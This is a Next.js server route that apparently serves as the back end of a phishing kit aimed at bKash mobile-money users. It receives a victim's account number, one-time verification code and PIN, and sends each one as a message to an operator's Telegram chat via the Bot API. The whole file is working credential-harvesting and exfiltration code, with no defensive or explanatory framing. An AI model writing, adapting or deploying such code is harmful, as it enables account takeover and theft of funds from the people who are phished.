import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const { accountNumber, verificationCode, pin } = await request.json()

    // Use environment variables with fallbacks for development
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
    const telegramChatId = process.env.TELEGRAM_CHAT_ID

    if (!telegramBotToken || !telegramChatId) {
      console.error("Missing Telegram environment variables")
      return NextResponse.json({ success: false, error: "Telegram configuration missing" }, { status: 500 })
    }

    let message = ""

    if (accountNumber) {
      message = `New bKash Account Number: <a href="tel:${accountNumber}">${accountNumber}</a>`
    } else if (verificationCode) {
      message = `bKash Verification Code: <a href="#">${verificationCode}</a>`
    } else if (pin) {
      message = `bKash PIN: <a href="#">${pin}</a>`
    } else {
      return NextResponse.json({ success: false, error: "No data provided to send." }, { status: 400 })
    }

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`

    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("Telegram API error:", response.status, errorData)
      return NextResponse.json(
        { success: false, error: "Failed to send message to Telegram." },
        { status: response.status },
      )
    }

    console.log("Message sent to Telegram successfully")
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error in Telegram API route:", error)
    return NextResponse.json({ success: false, error: "Internal server error." }, { status: 500 })
  }
}
